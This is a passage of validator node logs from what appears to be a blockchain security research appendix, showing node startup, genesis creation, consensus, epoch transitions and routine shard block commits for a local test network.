[0;32mINFO [0m[2026-10-06 22:14:21.022] [process/block]      [metachain/5/124/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 124 [0;32mnonce[0m = 121 [0;32mhash[0m = 7283e19ecdad4d0709bd01ff23b27caf8f3ebbdef5cf5571459e71585f2dc7e0 
[0;32mINFO [0m[2026-10-06 22:14:27.020] [process/block]      [metachain/5/125/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 125 [0;32mnonce[0m = 122 [0;32mhash[0m = dd63786cf55f3ee595c42992b439c2dd7e4438c4314a56b3a132bcf09fe210fa 
[0;32mINFO [0m[2026-10-06 22:14:33.025] [process/block]      [metachain/5/126/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 4294967295 [0;32mround[0m = 126 [0;32mnonce[0m = 123 [0;32mhash[0m = 12ca7cb6897310f7990895358652a2382b1eadf3487941f98fe197f84ba033c4 
[0;32mINFO [0m[2026-10-06 22:14:34.068] [node]               [metachain/5/126/(END_ROUND)] terminating at user's signal...          
```

### C 5.3, validator3 full log, shard process started 22:01:39, 123 blocks committed, terminated 22:14:33

File `security-research/node-logs/validator3.log`.

```text
[0;32mINFO [0m[2026-10-06 22:01:39.371] [node]               [/0/0/]        starting node                            [0;32mversion[0m = v1.0.0/go1.26.4/darwin-arm64/3bd876d357 [0;32mpid[0m = 43290 
[0;32mINFO [0m[2026-10-06 22:01:39.374] [factory]            [/0/0/]        start time                               [0;32mformatted[0m = Tue Oct 6 22:01:57 WAT 2026 [0;32munix timestamp[0m = 1791320517 [0;32msupernova unix timestamp[0m = 1791323157 [0;32mround duration[0m = 6s [0;32msupernova round duration[0m = 6s 
[0;32mINFO [0m[2026-10-06 22:01:39.375] [factory]            [/0/0/]        the node loaded the validatorKey.pem file and is running in single-key mode 
[0;32mINFO [0m[2026-10-06 22:01:39.403] [factory]            [/0/0/]        p2p private key: generated a new private key for p2p signing 
[0;32mINFO [0m[2026-10-06 22:01:39.409] [main/p2p]           [/0/0/]        listening on addresses                   [0;32maddr0[0m = /ip4/127.0.0.1/tcp/21503/p2p/16Uiu2HAmKVKnhLsm72X9AH84XNh9YeE24N5fGaYyPYE6viUw1ZWq [0;32maddr1[0m = /ip4/172.20.10.5/tcp/21503/p2p/16Uiu2HAmKVKnhLsm72X9AH84XNh9YeE24N5fGaYyPYE6viUw1ZWq 
[0;32mINFO [0m[2026-10-06 22:01:39.410] [main/p2p]           [/0/0/]        started the network discovery process... 
[0;32mINFO [0m[2026-10-06 22:01:59.411] [factory]            [/0/0/]        shard info                               [0;32mstarted in shard[0m = 0 
[0;32mINFO [0m[2026-10-06 22:01:59.412] [factory]            [/0/0/]        bootstrap parameters                     [0;32mshardId[0m = 0 [0;32mepoch[0m = 0 [0;32mnumShards[0m = 1 
[0;32mINFO [0m[2026-10-06 22:01:59.412] [node]               [/0/0/]        Bootstrap                                [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.516] [..nodesCoordinator] [0/0/0/]       new nodes config is set for epoch        [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.539] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:06.549] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.909] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.914] [genesis/process]    [0/0/0/]       genesisBlockCreator.createHeaders        [0;32mshard[0m = 0 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 79c9a65d56dd423b42fde0405f173fbaf42d081e4de05780814e509da6664770 
[0;32mINFO [0m[2026-10-06 22:02:09.923] [genesis/process]    [0/0/0/]       genesisBlockCreator.createHeaders        [0;32mshard[0m = 4294967295 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 5b8c8589b3a99e69f13a0e556ed873b94e6236d4756c19ebd16de6e62792ff8d 
[0;32mINFO [0m[2026-10-06 22:02:10.275] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.415] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.418] [factory]            [0/0/0/]       AOT transaction selection enabled        [0;32mcacheSize[0m = 10 [0;32mselectionTimeoutMs[0m = 30000 
[0;32mINFO [0m[2026-10-06 22:02:10.449] [factory]            [0/0/0/]       indexGenesisBlocks(): historyRepo.RecordBlock [0;32mshardID[0m = 0 [0;32mhash[0m = 44c8ad7cae76622aec11467c2c08d55e08eb2168dc1f67baf8108e349e41732d 
[0;32mINFO [0m[2026-10-06 22:02:10.728] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.789] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;33mWARN [0m[2026-10-06 22:02:10.792] [state]              [0/0/0/]       could not retrieve snapshot info         [0;33merror[0m = key not found 
[0;32mINFO [0m[2026-10-06 22:02:10.792] [factory]            [0/0/0/]       starting consensus                       [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.802] [vmContainerFactory] [0/0/2/(START_ROUND)] VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.807] [node]               [0/0/2/(BLOCK)] application is now running               
[0;32mINFO [0m[2026-10-06 22:02:10.877] [processProxy]       [0/0/2/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.906] [processProxy]       [0/0/2/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:11.041] [process/block]      [0/0/2/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 2 [0;32mnonce[0m = 1 [0;32mhash[0m = d5bdd96278b9dbd0f5207b2b83bc0f27043f074c125dc9070489f05efd7348aa 
[0;32mINFO [0m[2026-10-06 22:02:15.015] [process/block]      [0/0/3/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 3 [0;32mnonce[0m = 2 [0;32mhash[0m = 36586d5593d9fbb8f43f889cc78200efed240d8f77671bdb1deea97a72d82e04 
[0;32mINFO [0m[2026-10-06 22:02:21.018] [process/block]      [0/0/4/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 4 [0;32mnonce[0m = 3 [0;32mhash[0m = f7ab2e1fc0e18335e948b13fb3468942c4b09c2d6092eff80e8bd8b179528d67 
[0;32mINFO [0m[2026-10-06 22:02:27.013] [process/block]      [0/0/5/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 5 [0;32mnonce[0m = 4 [0;32mhash[0m = d3545a9a67a0580e3e8f9479a2a8f191a7bdaacddab847f05bedd76065626d3a 
[0;32mINFO [0m[2026-10-06 22:02:33.021] [process/block]      [0/0/6/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 6 [0;32mnonce[0m = 5 [0;32mhash[0m = 9d470069c6137fe2d43a3d458807089baeee6639c070592bff6255b1b46c7070 
[0;32mINFO [0m[2026-10-06 22:02:39.022] [process/block]      [0/0/7/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 7 [0;32mnonce[0m = 6 [0;32mhash[0m = 8022e0edb3f7b3a39cb074302123db3a9817edaa8d99bc51fb9f7e637143e54c 
[0;32mINFO [0m[2026-10-06 22:02:45.015] [process/block]      [0/0/8/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 8 [0;32mnonce[0m = 7 [0;32mhash[0m = 8458e3fdc458619cb5ab4abf4388ee5fbe81d6ec0479c9a4f69b2e5748bd16c1 
[0;32mINFO [0m[2026-10-06 22:02:51.015] [process/block]      [0/0/9/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 9 [0;32mnonce[0m = 8 [0;32mhash[0m = fcc9c238e3c0b8583d0ac32f3fc6d993d69408b046c35359d37fa2a7ba9920aa 
[0;32mINFO [0m[2026-10-06 22:02:57.019] [process/block]      [0/0/10/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 10 [0;32mnonce[0m = 9 [0;32mhash[0m = 3251be20e3a1430b0cb2aaf39abb7d6f68d4743b9bb63ae63b36464a7436fd57 
[0;32mINFO [0m[2026-10-06 22:03:03.017] [process/block]      [0/0/11/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 11 [0;32mnonce[0m = 10 [0;32mhash[0m = d7751e8c75702442ebebd173e134f3bbe2843dc6d63110283d529b518f58d818 
[0;32mINFO [0m[2026-10-06 22:03:09.017] [process/block]      [0/0/12/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 12 [0;32mnonce[0m = 11 [0;32mhash[0m = a5afdd224e6e20c412a9110259ad74fcf5a3cfb4af7bd55c831f847aa9971f6e 
[0;32mINFO [0m[2026-10-06 22:03:15.019] [process/block]      [0/0/13/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 13 [0;32mnonce[0m = 12 [0;32mhash[0m = 3f9e2b17674e22f6c44f9391142afe082368930b3f979a1b0a6ab1ff6db3a2dc 
[0;32mINFO [0m[2026-10-06 22:03:21.017] [process/block]      [0/0/14/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 14 [0;32mnonce[0m = 13 [0;32mhash[0m = 58ec9c87aabf474fee7c30fb5d1b83598bbaddfc16aedc73e089f415b5be7d7a 
[0;32mINFO [0m[2026-10-06 22:03:27.015] [process/block]      [0/0/15/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 15 [0;32mnonce[0m = 14 [0;32mhash[0m = da363faaef0e970e4a6f0dff6ae4902d014556b192495b8ad4c7e66dcd56fea3 
[0;32mINFO [0m[2026-10-06 22:03:33.022] [process/block]      [0/0/16/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 16 [0;32mnonce[0m = 15 [0;32mhash[0m = cc0a413ba2c205daf2a926df638df38d865b29aa5bb5e544e62658874ece68e7 
[0;32mINFO [0m[2026-10-06 22:03:39.015] [process/block]      [0/0/17/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 17 [0;32mnonce[0m = 16 [0;32mhash[0m = 7a1fca6d7e7d454798cbc4da4b88665dac5b4afeb426b5d67299f63157e79567 
[0;32mINFO [0m[2026-10-06 22:03:45.016] [process/block]      [0/0/18/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 18 [0;32mnonce[0m = 17 [0;32mhash[0m = a24bcbbb118cca329fe797216f78d8ed81cb5f67460e5a8e08104ad47d1ed483 
[0;32mINFO [0m[2026-10-06 22:03:51.025] [process/block]      [0/0/19/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 19 [0;32mnonce[0m = 18 [0;32mhash[0m = 1d440629ecaab36c1d1995c866f4525fab933d4933c0abb50eee4664c42251ce 
[0;32mINFO [0m[2026-10-06 22:03:57.012] [process/block]      [0/0/20/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 20 [0;32mnonce[0m = 19 [0;32mhash[0m = d5edaee92782c5150a9e8a5bcf9d59077440de006d3446df18f039f115e05fc1 
[0;32mINFO [0m[2026-10-06 22:04:03.015] [process/block]      [0/0/21/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 21 [0;32mnonce[0m = 20 [0;32mhash[0m = e88f671ee60e08ecf0471ca0b7411370ecd0b70cc58ad88b9862be9cd3dcb3a1 
[0;32mINFO [0m[2026-10-06 22:04:09.016] [process/block]      [0/0/22/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 22 [0;32mnonce[0m = 21 [0;32mhash[0m = 5f6dd2ec590bcaa8bb39195e9bd4794405995ad00d0092516217692c88243d6c 
[0;32mINFO [0m[2026-10-06 22:04:15.013] [process/block]      [0/0/23/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 23 [0;32mnonce[0m = 22 [0;32mhash[0m = 18578d86977b586cbce97167926e717ded597fb2230d2bceb4f2dfabf63a8b60 
[0;32mINFO [0m[2026-10-06 22:04:21.013] [process/block]      [0/0/24/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 24 [0;32mnonce[0m = 23 [0;32mhash[0m = 18bd49d3bbda56fe4e5564ae770d51511fda48a83dd39feb84d7ce77fd7ff9ab 
[0;32mINFO [0m[2026-10-06 22:04:27.015] [process/block]      [0/0/25/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 25 [0;32mnonce[0m = 24 [0;32mhash[0m = 34a7ea4de92180120f258f31622f7ea73777251a1aaa88b6ca06193d214e50cb 
[0;32mINFO [0m[2026-10-06 22:04:33.018] [process/block]      [0/0/26/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 26 [0;32mnonce[0m = 25 [0;32mhash[0m = 579e849de660393f9617fd08724e0bc658fa49c9607bc009ab625706d5279eca 
[0;32mINFO [0m[2026-10-06 22:04:39.020] [processProxy]       [0/1/27/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:39.020] [processProxy]       [0/1/27/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:49.909] [process/block]      [0/1/28/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 28 [0;32mnonce[0m = 26 [0;32mhash[0m = f9c7d6f5851cd6f918d56c686bb639c5371f3c457f4a972b637c72d0b814e166 
[0;32mINFO [0m[2026-10-06 22:04:49.913] [state]              [0/1/28/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 79c9a65d56dd423b42fde0405f173fbaf42d081e4de05780814e509da6664770 [0;32mepoch[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:51.023] [process/block]      [0/1/29/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 29 [0;32mnonce[0m = 27 [0;32mhash[0m = d72db60a3ba3f76f2e43bd6f2671a89840e19b8eb399aacdc337926acbbdb0de 
[0;32mINFO [0m[2026-10-06 22:04:57.022] [process/block]      [0/1/30/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 30 [0;32mnonce[0m = 28 [0;32mhash[0m = d41b91c520c1a19432fda0bdd0ff5a20b52d27bb744a67f219059a88d257ad6f 
[0;32mINFO [0m[2026-10-06 22:04:58.472] [txsSender]          [0/1/30/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 1 
[0;32mINFO [0m[2026-10-06 22:05:03.019] [process/block]      [0/1/31/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 31 [0;32mnonce[0m = 29 [0;32mhash[0m = e097f2f6af1a03acf564fd1db08a79de52cf21a1b3304c3e605d7cf199f7d8e3 
[0;32mINFO [0m[2026-10-06 22:05:09.018] [process/block]      [0/1/32/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 32 [0;32mnonce[0m = 30 [0;32mhash[0m = b30735c1b534124f21adaa8cb55ff08e9ae5dcc0ab664c0b59326eb30fe2ae29 
[0;32mINFO [0m[2026-10-06 22:05:15.028] [process/block]      [0/1/33/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 33 [0;32mnonce[0m = 31 [0;32mhash[0m = 26ee8731261ba47e54827e21ee512223dbc3d34c6fd4d3fb2b1994b3c3b609b7 
[0;32mINFO [0m[2026-10-06 22:05:21.028] [process/block]      [0/1/34/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 34 [0;32mnonce[0m = 32 [0;32mhash[0m = fad1e91ddfbe5276917e94129538fb7e0bb4773f7fef1b90670d6b2a09acae4d 
[0;32mINFO [0m[2026-10-06 22:05:27.024] [process/block]      [0/1/35/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 35 [0;32mnonce[0m = 33 [0;32mhash[0m = f5341383ffa39c91eec82579b5ff574f85b51d3ddc580fb8199e0a1536637e12 
[0;32mINFO [0m[2026-10-06 22:05:33.019] [process/block]      [0/1/36/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 36 [0;32mnonce[0m = 34 [0;32mhash[0m = 61ea7b42c995e12be99bd59668db8f48b449216f05ef8a7f5b91a9a9c3b2fd79 
[0;32mINFO [0m[2026-10-06 22:05:39.022] [process/block]      [0/1/37/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 37 [0;32mnonce[0m = 35 [0;32mhash[0m = a3e5c96e7d34fc453e171c92ba4ee5559674951d6d77dd77885fee512599f613 
[0;32mINFO [0m[2026-10-06 22:05:40.475] [txsSender]          [0/1/37/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 2 
[0;32mINFO [0m[2026-10-06 22:05:45.017] [process/block]      [0/1/38/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 38 [0;32mnonce[0m = 36 [0;32mhash[0m = cd6646c16b5d7b2f1c881b600412c4921ca59a7b400227a7b8c81bec5a360fc0 
[0;32mINFO [0m[2026-10-06 22:05:51.030] [process/block]      [0/1/39/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 39 [0;32mnonce[0m = 37 [0;32mhash[0m = 85471babb00c8eaed4f1b0863d262b337b72a43c1c0a8c9cb7ec299c8da44da5 
[0;32mINFO [0m[2026-10-06 22:05:57.023] [process/block]      [0/1/40/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 40 [0;32mnonce[0m = 38 [0;32mhash[0m = 3a4c5a6fdc068112bc997093d2145763fd9f979132d6b208b439d18e44d056d6 
[0;32mINFO [0m[2026-10-06 22:06:03.023] [process/block]      [0/1/41/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 41 [0;32mnonce[0m = 39 [0;32mhash[0m = 7be317ad062b3ee2e48b6f3cac5a5081936ffec302ca083dda1da1182539c5a1 
[0;32mINFO [0m[2026-10-06 22:06:18.006] [process/block]      [0/1/43/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 43 [0;32mnonce[0m = 40 [0;32mhash[0m = 62ade4e48f729a692e13c9707173bf008d42e7337630fe0ad0e8a21ffd695047 
[0;32mINFO [0m[2026-10-06 22:06:21.033] [process/block]      [0/1/44/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 44 [0;32mnonce[0m = 41 [0;32mhash[0m = b24399f37dff235d8252e514d4c6d94dc10a0f6b2dbcb0c3264bea9c1fbc47f3 
[0;32mINFO [0m[2026-10-06 22:06:22.479] [txsSender]          [0/1/44/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 3 
[0;32mINFO [0m[2026-10-06 22:06:27.025] [process/block]      [0/1/45/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 45 [0;32mnonce[0m = 42 [0;32mhash[0m = ac6ea7dba63d2ca816bc09e57aa56beda2fc89c311681cf8d6572c5f19410be1 
[0;32mINFO [0m[2026-10-06 22:06:33.022] [process/block]      [0/1/46/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 46 [0;32mnonce[0m = 43 [0;32mhash[0m = 8036e413b7f84717e241205304b6967a6b42372145db3574b49a3fdd8f69d415 
[0;32mINFO [0m[2026-10-06 22:06:39.017] [process/block]      [0/1/47/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 47 [0;32mnonce[0m = 44 [0;32mhash[0m = d433f3c0bdfb6977a790d1d3ba60abf059e18a00f120f0ea3af009c590ffcc1a 
[0;32mINFO [0m[2026-10-06 22:06:45.026] [process/block]      [0/1/48/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 48 [0;32mnonce[0m = 45 [0;32mhash[0m = 8d284ab63355d3fdc06361b7373d055ea9b0a8b8f7725c20e3db60e136e2cb48 
[0;32mINFO [0m[2026-10-06 22:06:51.025] [process/block]      [0/1/49/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 49 [0;32mnonce[0m = 46 [0;32mhash[0m = cc29082633c650dd24e6a36d6c27b67b25c15c39f5a4284a8efebf8437d83c98 
[0;32mINFO [0m[2026-10-06 22:06:57.024] [process/block]      [0/1/50/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 50 [0;32mnonce[0m = 47 [0;32mhash[0m = f93f78d1b87acffc2b890caf5f53e20d5b9478086b85d7cf1897fdb507127622 
[0;32mINFO [0m[2026-10-06 22:07:03.020] [process/block]      [0/1/51/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 51 [0;32mnonce[0m = 48 [0;32mhash[0m = 754796a81a99a5e8b504cee5e13aa086f9156c4ddc472380caf32c1d1f05c408 
[0;32mINFO [0m[2026-10-06 22:07:04.482] [txsSender]          [0/1/51/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 4 
[0;32mINFO [0m[2026-10-06 22:07:09.012] [processProxy]       [0/2/52/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:07:09.012] [processProxy]       [0/2/52/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:07:11.057] [process/block]      [0/2/52/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 52 [0;32mnonce[0m = 49 [0;32mhash[0m = 2eeb4c93b92261f08f33f8ec3a4858e6f1e84d60d6ea643d77e031e15849f202 
[0;32mINFO [0m[2026-10-06 22:07:11.060] [state]              [0/2/52/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = a518a5c28291a61b129dfd908f2492adb0ac4f9425d9adc0fc072e39a59d2f0f [0;32mepoch[0m = 2 
[0;32mINFO [0m[2026-10-06 22:07:11.060] [process/block]      [0/2/52/(END_ROUND)] supernova transition is ready            [0;32mshard[0m = 0 [0;32mnonce[0m = 49 [0;32mhash[0m = 2eeb4c93b92261f08f33f8ec3a4858e6f1e84d60d6ea643d77e031e15849f202 [0;32mepoch[0m = 2 [0;32mround[0m = 52 
[0;32mINFO [0m[2026-10-06 22:07:15.017] [process/block]      [0/2/53/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 53 [0;32mnonce[0m = 50 [0;32mhash[0m = 9e424fc756e7d48ac81bdc19a20824f6b38d2e53626e8475dd85a434399f9038 
[0;32mINFO [0m[2026-10-06 22:07:21.032] [process/block]      [0/2/54/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 54 [0;32mnonce[0m = 51 [0;32mhash[0m = 3538b19ce9ad03d99f8060ef759ea1fa32ac6982c50eda20cd2c67934e5336bc 
[0;32mINFO [0m[2026-10-06 22:07:27.019] [process/block]      [0/2/55/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 55 [0;32mnonce[0m = 52 [0;32mhash[0m = 68ec1297b966cacb680bb988ac42effa38afc9e580d72983b7006489825a80a2 
[0;32mINFO [0m[2026-10-06 22:07:33.018] [process/block]      [0/2/56/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 56 [0;32mnonce[0m = 53 [0;32mhash[0m = 608cd4a284caca7ddf70cb5e0aea914c3aa0fbc605d87601a06f834f221685ec 
[0;32mINFO [0m[2026-10-06 22:07:39.015] [process/block]      [0/2/57/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 57 [0;32mnonce[0m = 54 [0;32mhash[0m = 2131c5a99673d22dce03747566dc2288270ae224aa36d26002e94d843ee62900 
[0;32mINFO [0m[2026-10-06 22:07:45.019] [process/block]      [0/2/58/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 58 [0;32mnonce[0m = 55 [0;32mhash[0m = a68386bda3d914aef78d1a30b51f4f717c75debbf65123a4e1c1a5cf425b9e77 
[0;32mINFO [0m[2026-10-06 22:07:51.018] [process/block]      [0/2/59/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 59 [0;32mnonce[0m = 56 [0;32mhash[0m = 7465bca05cad5d9424100c1425e0d53a0d9b2087a6bd0a4cdae7d949344b615d 
[0;32mINFO [0m[2026-10-06 22:07:57.022] [process/block]      [0/2/60/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 60 [0;32mnonce[0m = 57 [0;32mhash[0m = 57bfb935e64a756d45fb2e73d6172214a9fc6e2389737ecb2b0307c230151a14 
[0;32mINFO [0m[2026-10-06 22:08:03.020] [process/block]      [0/2/61/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 61 [0;32mnonce[0m = 58 [0;32mhash[0m = 71ff11a30aeb99162b207422b686d39d592699393155419997acfe39c561d4ed 
[0;32mINFO [0m[2026-10-06 22:08:09.016] [process/block]      [0/2/62/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 62 [0;32mnonce[0m = 59 [0;32mhash[0m = 34cbab52b6d4fbf1890efdc4074c007fdb3003826d8d16b98d7ba813baff3283 
[0;32mINFO [0m[2026-10-06 22:08:15.017] [process/block]      [0/2/63/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 63 [0;32mnonce[0m = 60 [0;32mhash[0m = 76a498ab7fc288982a6baa46f37d7f03644c420ad3d78be1ab4c8bd19df3417b 
[0;32mINFO [0m[2026-10-06 22:08:21.021] [process/block]      [0/2/64/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 64 [0;32mnonce[0m = 61 [0;32mhash[0m = f29bc614ab9bd58f8296f8dbe120dbe4fe8bbd3dc5dad4447e3252e450d917ec 
[0;32mINFO [0m[2026-10-06 22:08:27.018] [process/block]      [0/2/65/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 65 [0;32mnonce[0m = 62 [0;32mhash[0m = b9391d22672c7a2cb7083724286af774240bb58ac76abd635919365a63ea2b54 
[0;32mINFO [0m[2026-10-06 22:08:33.015] [process/block]      [0/2/66/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 66 [0;32mnonce[0m = 63 [0;32mhash[0m = bbd7c3bc2aafef38f22ba7338751b538de4aeae7118e536abca571f7eabcf462 
